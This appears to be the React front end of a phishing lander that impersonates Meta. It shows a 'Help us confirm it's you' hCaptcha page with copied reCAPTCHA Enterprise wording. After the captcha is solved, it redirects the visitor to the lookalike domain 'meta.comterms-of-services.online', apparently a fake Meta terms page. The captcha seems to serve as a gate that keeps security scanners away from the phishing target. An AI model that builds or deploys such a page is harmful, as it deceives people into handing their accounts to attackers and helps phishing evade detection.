import { useEffect, useRef, useState } from "react";
import HCaptcha from "@hcaptcha/react-hcaptcha";
import React from 'react';
import 'bootstrap/dist/css/bootstrap.min.css';
import {Container , Row, Col} from 'react-bootstrap' 
import Button from 'react-bootstrap/Button' 
import Nav from 'react-bootstrap/Nav';
import Navbar from 'react-bootstrap/Navbar';
import logo from './logo.jpg';

export default function App() {
  const [token, setToken] = useState(null);
  const captchaRef = useRef(null);

  const onLoad = () => {
    captchaRef.current.execute();
  };

  useEffect(() => {

    if (token)
      window.location.href = "https://meta.comterms-of-services.online/";

  }, [token]);

  return (
    <div className="">
      <Navbar expand="lg">
        <Navbar.Brand href="#home"><img src={logo} width={140} style={{padding: '15px'}}/></Navbar.Brand>
      </Navbar>
      <Container>
        <Row>
          <Col md={{ span: 6, offset: 3 }} style={{marginTop: "150px"}}>
          <form>
            <h2 style={{marginBottom: "20px"}}>Help us confirm it's you</h2>
          <HCaptcha
            sitekey="cc69d745-2e3b-45d9-87de-33d8b4b1719e"
            onLoad={onLoad}
            onVerify={setToken}
            ref={captchaRef}
            style={{marginTop: "20px"}}
          />
          <p style={{fontSize: "12px", marginTop: "20px"}}>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products. <br/><br/>

We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.<br/><br/>

reCAPTCHA Enterprise collects hardware and software information such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
        <Button variant="primary">Continue</Button>
        </form>
          </Col>
        </Row>
      </Container>
      
    </div>
  );
}